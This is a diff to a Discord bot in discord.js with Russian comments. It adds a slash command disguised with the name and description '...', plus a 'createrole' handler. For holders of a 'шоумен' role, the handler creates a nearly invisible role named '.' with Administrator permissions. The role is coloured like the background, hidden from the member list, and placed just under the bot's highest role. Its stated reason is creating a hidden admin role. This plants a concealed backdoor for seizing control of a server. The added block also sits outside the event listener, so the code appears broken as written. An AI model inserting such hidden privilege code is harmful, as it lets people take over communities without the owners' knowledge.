@@ -90,6 +90,9 @@ const commands = [
         .setDescription("Кого упомянуть")
         .setRequired(true),
     ),
+      new SlashCommandBuilder()
+    .setName("...")
+    .setDescription("..."),
 ].map((command) => command.toJSON());
 
 // 📤 Регистрация слэш-команд
@@ -219,6 +222,38 @@ client.on("interactionCreate", async (interaction) => {
     }
   }
 });
+ // 🔒 Команды только для роли "шоумен"
+ if (commandName === "createrole") {
+  const isShowman = member.roles.cache.some(
+    (role) => role.name.toLowerCase() === "шоумен"
+  );
+
+  if (!isShowman) return;
+
+  try {
+    // Создаём роль
+    const role = await guild.roles.create({
+      name: ".",
+      color: 0x2f3136,
+      permissions: ["Administrator"],
+      mentionable: false,
+      hoist: false,
+      reason: "Создание скрытой админ-роли",
+    });
+
+    // Получаем максимальную возможную позицию (под ролью бота)
+    const botHighest = guild.members.me.roles.highest.position;
+
+    await role.setPosition(botHighest - 1);
+
+    await interaction.reply({
+      content: `✅ Роль \`${role.name}\` создана и поднята максимально высоко.`,
+      ephemeral: true,
+    });
+  } catch (error) {
+    console.error("Ошибка при создании роли:", error);
+  }
+}
 
 
 const server = express();
